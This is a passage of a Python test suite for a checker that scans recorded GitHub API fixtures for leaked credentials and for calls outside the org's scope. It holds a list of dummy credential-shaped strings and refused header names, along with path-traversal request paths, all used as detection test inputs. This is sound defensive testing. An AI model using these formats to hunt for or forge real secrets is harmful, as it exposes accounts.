    data.update(fields)
    return json.dumps(data, indent=2)


GROUNDING = (ROOT / "sim" / "grounding.py").read_text()


def grounded(fixture_path: str, trials: str = '("P-18",)') -> str:
    """sim/grounding.py with the rule P-18 asks grounded by `fixture_path`, a path or a tuple of them written as a
    literal, and asked by `trials`."""
    rule = '("P-18",), None)'
    assert GROUNDING.count(rule) == 1
    literal = fixture_path if fixture_path.startswith("(") else '"%s"' % fixture_path
    return GROUNDING.replace(rule, '%s, %s)' % (trials, literal))


TAIL = "A" * 36
# What the security pass tried to slip through. Each must be refused wherever it stands in a fixture.
SHAPED = {
    "ghp": "gh" + "p_" + TAIL, "gho": "gh" + "o_" + TAIL, "ghu": "gh" + "u_" + TAIL, "ghs": "gh" + "s_" + TAIL,
    "ghr": "gh" + "r_" + TAIL, "short ghs": "gh" + "s_short", "pat": "github" + "_pat_11" + "A" * 20 + "_" + "b" * 59,
    "after an underscore": "x_gh" + "p_" + TAIL, "after a digit": "%3Agh" + "p_" + TAIL, "upper case": "GH" + "P_" + TAIL,
    "raw url": "https://raw.githubusercontent.com/o/r/main/f?to" + "ken=GHSAT0AAAAAACAAAAAAAAAAAAAAAAAAZZZZZZ",
    "ghsat": "GHS" + "AT0AAAAAACAAAAAA", "jwt": "eyJ" + "hbGciOiJSUzI1NiJ9.eyJpc3MiOiIxMjMifQ.sig", "short jwt": "eyJ" + "0eXAi.eyJ.sig",
    "token scheme": "tok" + "en abcdef0123456789abcdef0123456789abcdef",
    "basic": "Bas" + "ic eC1hY2Nlc3MtdG9rZW46Z2hzX0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB",
    "bearer": "Bear" + "er abc", "bearer in capitals": "BEAR" + "ER abc",
    "set-cookie in a string": "Set-" + "Cookie: user_session=abcdef; path=/", "authorization in a string": "Authoriz" + "ation: x",
    "user and password in a url": "https://don:hunt" + "er2@github.com/combsmith/x.git",
    "token in a url": "https://x-access-tok" + "en:gh" + "s_" + TAIL + "@github.com/o/r",
    "signed url": "https://productionresultssa0.blob.core.windows.net/x?sv=2019&s" + "ig=AbCdEf%2Bxyz%3D&se=2026",
    "amazon signature": "https://objects.githubusercontent.com/x?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Sign" + "ature=abcd1234",
    "amazon credential": "https://x/y?X-Amz-Cred" + "ential=AKIDEXAMPLE%2F2026",
    "hex beside a keyword": "access_tok" + "en=" + "a1" * 20, "runner registration": "AABF3JGZDX3P5PMEXLND6TS6FCWO6",
    "jit config": "encoded_jit" + "_config", "private key": "-----BEGIN OPENSSH PRIV" + "ATE KEY-----\nb3Blbn",
    "private key body": "MIIEowIBAAKCAQEA" + "x" * 60, "openssh key body": "b3BlbnNzaC1rZXktdjE" + "AAAAB",
    "base64 of a token": base64.b64encode(("gh" + "p_" + TAIL).encode()).decode(),
    "base64 of a runner's credentials": base64.b64encode(json.dumps({".runner": "x", ".credentials_rsaparams": "k"}).encode()).decode(),
    "anthropic": "sk-" + "ant-oat01-" + "A" * 40,
    "base64 of a token behind a byte that does not print": base64.b64encode(("\x00gh" + "p_" + TAIL).encode()).decode(),
}
# What a fixture keeps: GitHub's ordinary words must not be refused.
PLAIN = ["6dcb09b5b57875f334f61aebed695e2e4193db5e", "a" * 40, "application/vnd.github+json", "MDQ6VXNlcjE=",
         "https://api.github.com/repos/combsmith/x/check-runs/4", "2026-10-15T14:02:11Z", "Requires authentication",
         "highs and lows", "bearer", "factory-run-r1", "Resource not accessible by integration"]
REFUSED_KEYS = ["Authorization", "AUTHORIZATION", "Authorization ", "Proxy-Authorization", "Set-Cookie", "cookie",
                "x-github-otp", "x-access-token", "github_token", "GITHUB_TOKEN", "accessToken", "installation_token",
                "encoded_jit_config", "x-jit-config", "jwt", "auth", "Auth ", "webhook_secret", "client_secret", "password", "credentials", "token"]
PLAIN_KEYS = ["token_type", "input_tokens", "output_tokens", "location", "key", "value", "author", "external_id",
              # The vendor CLI's counts (issue 178), as it spells them.
              "inputTokens", "outputTokens", "cacheReadInputTokens", "cacheCreationInputTokens", "maxOutputTokens",
              "thinkingTokens", "ephemeral_1h_input_tokens", "ephemeral_5m_input_tokens", "output_tokens_details"]
# Not caught, by design or as a known hole: a commit hash alone is no credential; a token split across two strings
# and a one-time code alone have no shape. The field names a header or field must have are the guard there.


class Trials(unittest.TestCase):
    def test_a_fixture_that_is_misnamed_or_invalid_is_caught(self):
        root = clone({"trials/P-12.json": fixture(trial="P-13"), "trials/P-12.retry.json": "{}",
                      "trials/notes.md": "x\n", "trials/P12.json": fixture(), "trials/P-9.json/P-9.json": fixture(trial="P-9")})
        problems = check_trials.run(root)
        for words in ("trials/P-12.json: records trial P-13", "trials/P-12.retry.json: $: missing",
                      "trials/notes.md: trials/ holds fixtures only", "trials/P12.json: trials/ holds fixtures only",
                      "trials/P-9.json: trials/ holds fixtures only"):
            self.assertTrue(caught(problems, words), words)
        self.assertEqual(check_trials.run(clone({"trials/P-12.json": fixture(), "trials/P-12.retry.json": fixture()})), [])

    def test_a_credential_in_a_fixture_is_caught(self):
        for name, value in sorted(SHAPED.items()):
            self.assertTrue(check_trials._credentials({"note": value}, ""), name)
            self.assertTrue(check_trials._credentials({"a": [[{"b": [value]}]]}, ""), name)
        for value in PLAIN:
            self.assertEqual(check_trials._credentials({"note": value}, ""), [], value)
        for key in REFUSED_KEYS:
            self.assertTrue(check_trials._credentials({"a": [[{key: "x"}]]}, ""), key)
        for key in PLAIN_KEYS:
            self.assertEqual(check_trials._credentials({key: "x"}, ""), [], key)
        data = json.loads(fixture())
        data["exchanges"][0]["request"]["headers"]["Authorization"] = "x"
        data["exchanges"][0]["response"]["body"]["note"] = SHAPED["ghs"]
        problems = check_trials.run(clone({"trials/P-12.json": json.dumps(data)}))
        self.assertTrue(caught(problems, "trials/P-12.json: exchanges[0].request.headers.Authorization is a field"))
        self.assertTrue(caught(problems, "trials/P-12.json: exchanges[0].response.body.note holds something shaped"))
        self.assertFalse(any(SHAPED["ghs"] in p for p in problems), "a problem never repeats the credential")

    def test_a_header_a_fixture_may_not_keep_is_caught(self):
        data = json.loads(fixture())
        data["exchanges"][1]["response"]["headers"]["X-GitHub-SSO"] = "required"
        data["exchanges"][1]["response"]["headers"]["X-RateLimit-Used"] = "2"
        problems = check_trials.run(clone({"trials/P-12.json": json.dumps(data)}))
        self.assertTrue(caught(problems, "exchanges[1].response.headers.X-GitHub-SSO is not a header a fixture may keep"))
        self.assertFalse(caught(problems, "X-RateLimit-Used"))

    def test_every_example_of_a_fixture_and_the_folder_notes_are_scanned(self):
        data = json.loads((ROOT / "examples" / "invalid" / "trial.run-outside-the-canary.json").read_text())
        data["exchanges"][0]["request"]["headers"]["authorization"] = "x"
        notes = (ROOT / "trials" / "AGENTS.md").read_text() + "\nFor example " + SHAPED["ghs"] + "\n"
        problems = check_trials.run(clone({"examples/invalid/trial.run-outside-the-canary.json": json.dumps(data),
                                           "examples/trial.json": fixture(note=SHAPED["jwt"]), "trials/AGENTS.md": notes}))
        self.assertTrue(caught(problems, "examples/invalid/trial.run-outside-the-canary.json: exchanges[0].request.headers"))
        self.assertTrue(caught(problems, "examples/trial.json: note holds something shaped like a credential"))
        self.assertTrue(caught(problems, "trials/AGENTS.md: holds something shaped like a credential"))

    def test_a_null_repo_goes_with_a_subscription_and_nothing_else(self):
        # Decision 0033. The schema cannot tie the two together, so the check does, both ways.
        vendor = json.loads((ROOT / "examples" / "trial.a-vendors-cli.json").read_text())
        self.assertEqual(check_trials.run(clone({"trials/P-13.json": json.dumps(vendor)})), [])
        problems = check_trials.run(clone({"trials/P-12.json": fixture(repo=None)}))
        self.assertTrue(caught(problems, "trials/P-12.json: exchanges[0].request.as.kind is app, and repo is null"))
        self.assertTrue(caught(problems, "trials/P-12.json: exchanges[1].request.as.kind is app, and repo is null"))
        inside = dict(vendor, repo="combsmith/" + check_trials.CANARY)
        problems = check_trials.run(clone({"trials/P-13.json": json.dumps(inside)}))
        self.assertTrue(caught(problems, "trials/P-13.json: exchanges[0].request.as.kind is subscription, and repo is"))
        mixed = json.loads(json.dumps(vendor))
        mixed["exchanges"].append(json.loads(json.dumps(mixed["exchanges"][0])))
        mixed["exchanges"][1]["request"]["as"] = {"kind": "person", "name": "don-petry"}
        problems = check_trials.run(clone({"trials/P-13.json": json.dumps(mixed)}))
        self.assertTrue(caught(problems, "exchanges[1].request.as.kind is person, and repo is null"))
        self.assertFalse(caught(problems, "exchanges[0].request.as.kind"))
        problems = check_trials.run(clone({"examples/trial.json": fixture(repo=None)}))
        self.assertTrue(caught(problems, "examples/trial.json: exchanges[0].request.as.kind is app, and repo is null"))

    def test_the_org_is_the_repo_exactly_when_every_call_is_of_the_org_or_its_apps(self):
        # Decision 0035, both ways: a fixture of the org asks nothing of a repo, and one that asks only of the org
        # and its Apps records the org.
        reach = json.loads((ROOT / "trials" / "P-39.reach.json").read_text())
        self.assertEqual(check_trials.run(clone({"trials/P-39.reach.json": json.dumps(reach)})), [])
        of_a_repo = json.loads(json.dumps(reach))
        of_a_repo["exchanges"][1]["request"]["call"] = "GET /repos/combsmith/software-factory/installation"
        problems = check_trials.run(clone({"trials/P-39.reach.json": json.dumps(of_a_repo)}))
        self.assertTrue(caught(problems, "trials/P-39.reach.json: exchanges[1].request.call is not a REST call of the org "
                                         "or its Apps, and repo is combsmith"))
        self.assertFalse(caught(problems, "exchanges[0].request.call"))
        in_the_canary = dict(reach, repo="combsmith/" + check_trials.CANARY)
        problems = check_trials.run(clone({"trials/P-39.reach.json": json.dumps(in_the_canary)}))
        self.assertTrue(caught(problems, "trials/P-39.reach.json: repo is combsmith/%s, and every call is of the org "
                                         "or its Apps" % check_trials.CANARY))
        problems = check_trials.run(clone({"examples/trial.json": fixture(repo="combsmith")}))
        self.assertTrue(caught(problems, "examples/trial.json: exchanges[0].request.call is not a REST call of the org"))

    def test_a_fixture_of_the_org_asks_by_rest_of_this_org_alone_and_climbs_nowhere(self):
        # Another org, a GraphQL query whose call looks like an App's, and a path that climbs out of /apps/ are each
        # a call of something else; the fixture's own calls are not.
        reach = json.loads((ROOT / "trials" / "P-39.reach.json").read_text())
        reach["exchanges"] += [json.loads(json.dumps(reach["exchanges"][0])) for _ in range(4)]
        reach["exchanges"][3]["request"]["call"] = "GET /orgs/other-org/installations"
        reach["exchanges"][4]["request"]["via"] = "graphql"
        reach["exchanges"][4]["request"]["call"] = "GET /apps/combsmith-sf-reader"
        reach["exchanges"][5]["request"]["call"] = "GET /apps/../repos/combsmith/software-factory"
        reach["exchanges"][6]["request"]["call"] = "GET /installation/%2E%2E/repos/combsmith/software-factory"
        self.assertEqual([where for where, _ in check_trials._askers(reach)],
                         ["exchanges[%d].request.call" % i for i in (3, 4, 5, 6)])
        reach["exchanges"][3]["request"]["call"] = "GET /orgs/combsmith/installations?per_page=100"
        reach["exchanges"][4]["request"]["via"] = "rest"
        self.assertEqual([where for where, _ in check_trials._askers(reach)],
                         ["exchanges[5].request.call", "exchanges[6].request.call"])

    def test_a_call_of_a_repo_in_a_fixture_of_the_org_is_one_problem_whoever_asked(self):
        # The pairing is read once for the fixture, not once for each exchange, and an asker that cannot be read
        # neither hides it nor repeats it. The schema refuses such an asker first, so the pairing is read directly.
        reach = json.loads((ROOT / "trials" / "P-39.reach.json").read_text())
        reach["exchanges"][2]["request"]["call"] = "GET /repos/combsmith/software-factory/installation"
        self.assertEqual([where for where, _ in check_trials._askers(reach)], ["exchanges[2].request.call"])
        reach["exchanges"][0]["request"]["as"] = "combsmith-sf-controller"
        reach["exchanges"][1]["request"]["as"] = None
        org = [where for where, what in check_trials._askers(reach) if "is not a REST call of the org or its Apps" in what]
        self.assertEqual(org, ["exchanges[2].request.call"])
        problems = check_trials.run(clone({"trials/P-39.reach.json": json.dumps(reach)}))
        self.assertTrue(caught(problems, "trials/P-39.reach.json: $.exchanges[0].request.as: expected object"))

    def test_an_asker_named_by_an_address_is_caught(self):
        # Decision 0033: a fixture names who asked in words, never by an address that ties it to an account.
        vendor = json.loads((ROOT / "examples" / "trial.a-vendors-cli.json").read_text())
        vendor["exchanges"][0]["request"]["as"]["name"] = "account@example.com"
        problems = check_trials.run(clone({"trials/P-13.json": json.dumps(vendor),
                                           "examples/trial.a-vendors-cli.json": json.dumps(vendor)}))
        for where in ("trials/P-13.json", "examples/trial.a-vendors-cli.json"):
            self.assertTrue(caught(problems, where + ": exchanges[0].request.as.name looks like an address"), where)
        data = json.loads(fixture())
        data["exchanges"][1]["request"]["as"]["name"] = "combsmith-sf-trial@users.noreply.github.com"
        problems = check_trials.run(clone({"trials/P-12.json": json.dumps(data)}))
        self.assertTrue(caught(problems, "trials/P-12.json: exchanges[1].request.as.name looks like an address"))
        self.assertFalse(caught(problems, "exchanges[0].request.as.name"))

    def test_code_that_reads_the_canary_is_caught(self):
        name = "combsmith/" + check_trials.CANARY
        root = clone({"tools/fetch.py": "REPO = %r\n" % name, ".github/workflows/trial.yml": "repository: %s\n" % name,
                      "Makefile": "trial:\n\tgh api repos/%s\n" % name, "config/where.json": '{"repo": "%s"}' % name,
                      "docs/notes.md": name + "\n", "README.md": name + "\n", "trials/P-12.json": fixture(),
                      "sim/deep/er/x.py": name, "corpus/x.json": name,
                      ".claude/worktrees/other/.git": "gitdir: elsewhere\n", ".claude/worktrees/other/tools/x.py": name})
        problems = check_trials.run(root)
        for where in ("tools/fetch.py", ".github/workflows/trial.yml", "Makefile", "config/where.json", "sim/deep/er/x.py"):
            self.assertTrue(caught(problems, where + ": names the canary repo"), where)
        # Another working tree, and the corpus make_corpus.py writes, are not this repo's: tools/walk.py skips both.
        for where in ("docs/notes.md", "README.md", "trials/P-12.json", "examples/trial.json", "trial.schema.json", "worktrees",
                      "corpus", "config/apps.json", "schemas/apps.schema.json", "examples/invalid/apps."):
            self.assertFalse(caught(problems, where), where)

    def test_a_fixture_named_for_a_rule_must_exist_and_validate(self):
        problems = check_trials.run(clone({"sim/grounding.py": grounded("trials/P-18.json")}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: trials/P-18.json does not exist"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("trials/P-18.json"), "trials/P-18.json": "{}"}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: trials/P-18.json is not a valid fixture"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("trials/P-12.json"), "trials/P-12.json": fixture()}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: trials/P-12.json records P-12, and P-18 asks this"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("examples/trial.json")}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: examples/trial.json is not a fixture in trials/"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("trials/P-18.json", "()"),
                                           "trials/P-18.json": fixture(trial="P-18")}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: no trial asks this; add one to section 6 first"))
        root = clone({"sim/grounding.py": grounded("trials/P-18.json", '("P-7", "P-18")'),
                      "trials/P-18.json": fixture(trial="P-18")})
        self.assertEqual(check_trials.run(root), [])
        self.assertFalse(caught(check_trials.unverified(root), "a_killed_job_times_out"))
        self.assertTrue(caught(check_trials.unverified(), "a_killed_job_times_out"))

    def test_a_rule_may_be_grounded_by_a_tuple_of_fixtures_each_held_to_the_same_rules(self):
        # The last pusher is read from a person's push (P-28.json) and from an App's (P-28.app.json): one rule, two
        # fixtures, each of which must exist, validate and record a trial that asks the rule.
        both = grounded('("trials/P-18.json", "trials/P-18.app.json")')
        root = clone({"sim/grounding.py": both, "trials/P-18.json": fixture(trial="P-18"),
                      "trials/P-18.app.json": fixture(trial="P-18")})
        self.assertEqual(check_trials.run(root), [])
        self.assertFalse(caught(check_trials.unverified(root), "a_killed_job_times_out"))
        problems = check_trials.run(clone({"sim/grounding.py": both, "trials/P-18.json": fixture(trial="P-18")}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: trials/P-18.app.json does not exist"))
        problems = check_trials.run(clone({"sim/grounding.py": both, "trials/P-18.json": fixture(trial="P-18"),
                                           "trials/P-18.app.json": fixture(trial="P-12")}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: trials/P-18.app.json is not a valid fixture"))
        # A valid fixture of another trial, second in the tuple: each fixture must record a trial that asks the rule.
        problems = check_trials.run(clone({"sim/grounding.py": grounded('("trials/P-18.json", "trials/P-12.json")'),
                                           "trials/P-18.json": fixture(trial="P-18"), "trials/P-12.json": fixture()}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: trials/P-12.json records P-12, and P-18 asks this"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("()"), "trials/P-18.json": fixture(trial="P-18")}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: an empty tuple grounds nothing; write None"))

    def test_the_approval_trials_ground_the_rules_they_asked(self):
        # The sitting of 2026-10-19: P-7 passed with the App's push and the machine user's approval of it, and P-28
        # read the App's push; the rule P-7 contradicts stays unverified (sim/AGENTS.md, "Known to differ").
        by_code = {code: (trials, fixture) for code, _, trials, fixture in check_trials.rules()}
        self.assertEqual(by_code["an_app_pushes_to_the_head"], (("P-7",), "trials/P-7.json"))
        self.assertEqual(by_code["the_machine_users_approval_counts"], (("P-7",), "trials/P-7.json"))
        self.assertEqual(by_code["the_pusher_is_the_last_pusher"], (("P-28",), ("trials/P-28.json", "trials/P-28.app.json")))
        self.assertEqual(by_code["an_approval_survives_a_push"], (("P-7", "P-29"), None))
        self.assertTrue(caught(check_trials.unverified(), "an_approval_survives_a_push"))
        for name in ("P-1", "P-7", "P-7.maintainer-pushed", "P-24", "P-28.app"):
            data = json.loads((ROOT / "trials" / ("%s.json" % name)).read_text())
            self.assertEqual(data["verdict"], "pass", name)
            self.assertEqual(data["ran_at"][:10], "2026-10-19", name)

    def test_a_cost_measurements_exchanges_name_each_repo_they_span(self):
        # Decision 0035: a trial of repos records the canary as its home, and a measurement's reads may span the org's
        # repos. Held on what the reads say, for every fixture of the canary, and closed on what cannot be read: each
        # read names its owner, in its REST path or in every repository and organization call of its query, each
        # bound to a literal or to a declared variable, and a query with any other root field is refused; that owner
        # is the org; every repo an answer names, by nameWithOwner, full_name, or a name beside its owner's login,
        # is the org's; a read an App made names, and is answered with, only repos its installation reaches, the
        # canary alone for an App the data does not know; and a command-line read is the Maintainer's own.
        apps = json.loads((ROOT / "config" / "apps.json").read_text())["apps"]
        installed = {app["name"]: set(app["installed_on"]) for app in apps.values()}
        canary = "combsmith/" + check_trials.CANARY
        rest_path = re.compile(r"^[A-Z]+ /(?:repos/([^/?\s]+)/([^/?\s]+)|orgs/([^/?\s]+))")
        any_repos = re.compile(r"\brepos/([^/?\s]+)/([^/?\s]+)")
        root_field = re.compile(r"^(?:\w+\s*:\s*)?(\w+)\s*(?:\(([^)]*)\))?$")

        def roots(query):
            """Each root field of the one operation in `query`, as (field, its arguments): what stands at depth one
            of its selection set, outside strings. A fragment or a second operation is not read, and fails."""
            depth, found, text, quoted = 0, [], "", False
            for ch in query:
                if ch == '"':
                    quoted = not quoted
                if quoted:
                    text += ch
                    continue
                if ch == "{":
                    if depth == 1:
                        found.append(text.strip())
                        text = ""
                    depth += 1
                elif ch == "}":
                    depth -= 1
                    if depth == 1:
                        text = ""
                elif depth == 1:
                    text += ch
            out = []
            for item in found:
                found_field = root_field.match(item.strip())
                self.assertTrue(found_field, "a root field the test cannot read: %r" % item)
                out.append((found_field.group(1), found_field.group(2) or ""))
            return out

        argument = re.compile(r"\b(owner|name|login)\s*:\s*(?:\"([^\"]*)\"|\$(\w+))")

        def bound(args, key, variables):
            """The one value of `key` among `args`, a literal or a declared variable's; None if not exactly one."""
            found = [m for m in argument.finditer(args) if m.group(1) == key]
            if len(found) != 1:
                return None
            literal, var = found[0].group(2), found[0].group(3)
            return literal if literal is not None else variables.get(var)

        def names(value, under=None):
            """Each repo an answer names: nameWithOwner, full_name, or a name beside its owner's login, which an App,
            under the key app or with a slug, has as well and is not one."""
            if isinstance(value, dict):
                for key, item in value.items():
                    if key in ("nameWithOwner", "full_name") and isinstance(item, str):
                        yield item
                    yield from names(item, key)
                owner = value.get("owner")
                if isinstance(value.get("name"), str) and isinstance(owner, dict) and isinstance(owner.get("login"), str) \
                        and under != "app" and "slug" not in value:
                    yield owner["login"] + "/" + value["name"]
            elif isinstance(value, list):
                for item in value:
                    yield from names(item, under)

        def asked(request, where):
            """(owners, repos) a request names; a read that cannot be read fails the test here."""
            owners, repos = set(), set()
            if request["via"] == "graphql":
                body = request["body"]
                variables = body.get("variables") or {}
                self.assertTrue(body["query"].lstrip().startswith(("query", "{")), where + ": not a query")
                for field, args in roots(body["query"]):
                    if field == "repository":
                        owner, name = bound(args, "owner", variables), bound(args, "name", variables)
                        self.assertTrue(owner and name, "%s: a repository call that cannot be read: %s" % (where, args))
                        owners.add(owner)
                        repos.add(owner + "/" + name)
                    elif field == "organization":
                        login = bound(args, "login", variables)
                        self.assertTrue(login, "%s: an organization call that cannot be read: %s" % (where, args))
                        owners.add(login)
                    elif field != "rateLimit":
                        self.fail("%s: a root field the test does not read: %s" % (where, field))
                self.assertTrue(owners, where + ": a query that names no repo and no org")
            else:
                found = rest_path.match(request["call"])
                for owner, name in any_repos.findall(request["call"]):
                    owners.add(owner)
                    repos.add(owner + "/" + name)
                if found and found.group(3):
                    owners.add(found.group(3))
            return owners, repos

        checked = 0
        for path in sorted((ROOT / "trials").glob("P-*.json")):
            data = json.loads(path.read_text())
            if data["repo"] != canary:
                continue
            checked += 1
            for i, e in enumerate(data["exchanges"]):
                where = "%s exchange %d" % (path.name, i)
                request, asker = e["request"], e["request"]["as"]
                owners, repos = asked(request, where)
                answered = set(names(e["response"]["body"]))
                self.assertTrue(owners <= {"combsmith"}, "%s names %s" % (where, sorted(owners - {"combsmith"})))
                self.assertTrue(all(repo.startswith("combsmith/") for repo in answered),
                                "%s was answered %s" % (where, sorted(r for r in answered if not r.startswith("combsmith/"))))
                if request["via"] == "cli":
                    self.assertEqual(asker, {"kind": "person", "name": "don-petry"}, where)
                if asker["kind"] == "app":
                    reach = installed.get(asker["name"].split(",")[0].replace("[bot]", ""), {canary})
                    self.assertTrue(repos <= reach, "%s asks %s, beyond %s" % (where, sorted(repos - reach), sorted(reach)))
                    self.assertTrue(answered <= reach, "%s was answered %s, beyond the reach" % (where, sorted(answered - reach)))
        self.assertGreaterEqual(checked, 2)

    def test_the_cost_trials_estimate_is_marked_so_and_held_to_its_reads(self):
        # P-8's last exchange is the estimate (FR-35): its cost model is held to every read of the fixture that reports
        # a rateLimit, recomputed here from each read's own variables, and its hourly figures to its figures a pass.
        p8 = json.loads((ROOT / "trials" / "P-8.json").read_text())
        estimate = p8["exchanges"][-1]["response"]["body"]
        self.assertIn("estimate", estimate["method"])
        self.assertEqual(p8["exchanges"][-1]["request"]["via"], "cli")
        reads = [e for e in p8["exchanges"][:-1] if (e["response"]["body"].get("data") or {}).get("rateLimit")]
        self.assertEqual(len(reads), len(estimate["model_checks"]))
        self.assertTrue(len(reads) >= 20)

        def model(calls):
            return max(1, int(calls / 100 + 0.5))

        for read, check in zip(reads, estimate["model_checks"]):
            reported = read["response"]["body"]["data"]["rateLimit"]["cost"]
            self.assertEqual(check["reported"], reported, read["request"]["call"])
            v = read["request"]["body"].get("variables", {})
            if {"prs", "issues", "threads"} <= set(v):
                # The pass's read: 2 + P x (8 + T) + 3 x I connections, a page of 0 counted as 1.
                self.assertEqual(reported, model(2 + max(v["prs"], 1) * (8 + v["threads"]) + 3 * v["issues"]), read["request"]["call"])
            self.assertEqual(check["model"], reported)
        self.assertEqual([c["reported"] for c in estimate["model_checks"]][-5:], estimate["reader_app_costs"])
        a_pass = estimate["points_a_pass"]
        self.assertEqual(a_pass["sized_to_counts_every_page"], a_pass["sized_to_counts"] + a_pass["further_pages"])
        for key, hourly in estimate["points_an_hour"].items():
            self.assertEqual(hourly["at_12_passes_an_hour_the_schedule"], 12 * a_pass[key], key)
            self.assertEqual(hourly["passes_an_hour_W4_allows"], estimate["W4"] // a_pass[key], key)
        self.assertEqual(p8["verdict"], "pass")
        self.assertLess(estimate["points_an_hour"]["sized_to_counts_every_page"]["at_12_passes_an_hour_the_schedule"], estimate["W4"])
        # P-32 fails on the association an App reads, and shows the label events it read: the rule it asks stays
        # unverified, since no unlabeled event and no event on a pull request was read.
        p32 = json.loads((ROOT / "trials" / "P-32.json").read_text())
        self.assertEqual(p32["verdict"], "fail")
        by_person, by_app = (e["response"]["body"]["data"]["repository"]["issues"]["nodes"] for e in p32["exchanges"])
        self.assertEqual({i["authorAssociation"] for i in by_person}, {"MEMBER"})
        self.assertEqual({i["authorAssociation"] for i in by_app}, {"CONTRIBUTOR"})
        events = [e for i in by_app for e in i["timelineItems"]["nodes"]]
        self.assertTrue(events)
        self.assertTrue(all(e["actor"]["login"] and e["actor"]["__typename"] and e["createdAt"] for e in events))
        by_code = {code: fixture for code, _, _, fixture in check_trials.rules()}
        # The events ground the rule about them; the association, which an App reads wrong, stays unverified.
        self.assertEqual(by_code["a_label_event_names_its_actor"], "trials/P-32.json")
        self.assertIsNone(by_code["an_issues_author_has_an_association"])

    def test_a_rule_of_the_fake_that_is_not_listed_is_caught(self):
        world = (ROOT / "sim" / "world.py").read_text()
        problems = check_trials.run(clone({"sim/world.py": world + "\n# GitHub: a_rule_nobody_listed\n"}))
        self.assertTrue(caught(problems, "sim/world.py applies a_rule_nobody_listed, which sim/grounding.py does not list"))
        listed = GROUNDING.replace("RULES = (", 'RULES = (\n    ("a_rule_never_applied", "It is so", (), None),', 1)
        problems = check_trials.run(clone({"sim/grounding.py": listed}))
        self.assertTrue(caught(problems, "a_rule_never_applied is listed in sim/grounding.py and applied nowhere under sim/"))
        issues = (ROOT / "sim" / "issues.py").read_text()
        problems = check_trials.run(clone({"sim/issues.py": issues + "\n# GitHub: a_rule_nobody_listed\n"}))
        self.assertTrue(caught(problems, "sim/issues.py applies a_rule_nobody_listed, which sim/grounding.py does not list"))
        twice = GROUNDING.replace("RULES = (", 'RULES = (\n    ("a_tick_can_be_lost", "It is so", ("P-8",), None),', 1)
        self.assertTrue(caught(check_trials.run(clone({"sim/grounding.py": twice})), "a_tick_can_be_lost is listed twice"))
        for broken in ("RULES = rules()\n", "RULES = (('Not a code', 'x', ('P-1',), None),)\n", "RULES = (('x', 'x'),)\n",
                       "x = 1\n", "RULES = (('a_tick_can_be_lost', 'x', 'P-8', None),)\n"):
            self.assertTrue(check_trials.run(clone({"sim/grounding.py": broken})), broken)

    def test_verify_prints_every_rule_no_fixture_grounds(self):
        listed = check_trials.rules()
        codes = [code for code, _, _, fixture in listed if fixture is None]
        grounded = [code for code, _, _, fixture in listed if fixture is not None]
        self.assertTrue(codes)
        self.assertEqual(len(check_trials.unverified()), len(codes))
        ran = {}

        class Runner:
            def __init__(self, **_):
                pass

            def run(self, suite):
                ran["suite"] = suite
                return unittest.TestResult()

        real = (verify.failed, verify.unittest.TextTestRunner)
        verify.failed, verify.unittest.TextTestRunner = (lambda checks: False), Runner
        try:
            with contextlib.redirect_stdout(io.StringIO()) as said:
                self.assertEqual(verify.main([]), 0)
        finally:
            verify.failed, verify.unittest.TextTestRunner = real
        for code in codes:
            self.assertIn("unverified: " + code, said.getvalue())
        for code in grounded:
            self.assertNotIn("unverified: %s:" % code, said.getvalue())

    def test_the_check_runs_alone_before_anything_is_added(self):
        with contextlib.redirect_stdout(io.StringIO()) as said:
            self.assertEqual(check_trials.main(ROOT), 0)
            self.assertEqual(check_trials.main(clone({"trials/notes.txt": "x\n"})), 1)
        self.assertIn("trials/notes.txt", said.getvalue())

    def test_only_a_fixture_may_name_a_model_or_the_proof_of_concept(self):
        said = json.dumps({"model": "claude-" + "opus-5-5", "repo": "combsmith/" + check_repo.FOREIGN})
        problems = check_repo.run(tree({"trials/P-13.json": said, "trials/old/P-13.json": said, "trials/P-13.txt": said,
                                        "config/x.json": said}))
        for where in ("trials/old/P-13.json", "trials/P-13.txt", "config/x.json"):
            self.assertTrue(caught(problems, where + ": names a model"), where)
            self.assertTrue(caught(problems, where + ": names the proof-of-concept repo"), where)
        self.assertFalse(caught(problems, "trials/P-13.json"))


class TrialScript(unittest.TestCase):
    """`tools/trial_p13_cli.sh`, run against a stand-in CLI and never the real one (issue 178): the environment the CLI is
    given, each refusal before anything is asked, the login that must say yes, and the answer kept by allowlist so that
    no model text reaches OUT."""

    SCRIPT = ROOT / "tools" / "trial_p13_cli.sh"
    PIN = re.search(r"^PIN=(\S+)$", SCRIPT.read_text(), re.M).group(1)
    STAND_IN = """#!/bin/sh
here=$(cd "$(dirname "$0")" && pwd)
case "$1" in
  --version) env > "$here/env-version"; cat "$here/version"; exit "$(cat "$here/version.exit")" ;;
  auth) env > "$here/env-auth"; cat "$here/status"; exit "$(cat "$here/status.exit")" ;;
  -p) env > "$here/env-task"; printf '%s\\n' "$@" > "$here/args"; cat "$here/answer"; exit "$(cat "$here/answer.exit")" ;;
esac
exit 9
"""
    VALID = {"schema": "result/1", "run": "r_p13", "status": "completed",
             "dispositions": [{"finding": "f_9c1e", "decision": {"result": "accepted"}}]}
    # Words the model might say, planted where a careless script would let them through.
    PROSE = {"result": "the model wrote THIS-PROSE-1 here", "added": "a field the CLI adds carries THIS-PROSE-2",
             "nested": "THIS-PROSE-3 in a nested field", "denied": "THIS-PROSE-4 in a refused tool's input",
             "invalid": "THIS-PROSE-5 in a structured output that does not validate",
             "in_usage": "THIS-PROSE-6 in a string under the counts", "in_code": "THIS-PROSE-7 where a code should be"}

    def answer(self, output=None, **extra) -> dict:
        said = {"type": "result", "subtype": "success", "is_error": False, "num_turns": 1, "duration_ms": 5,
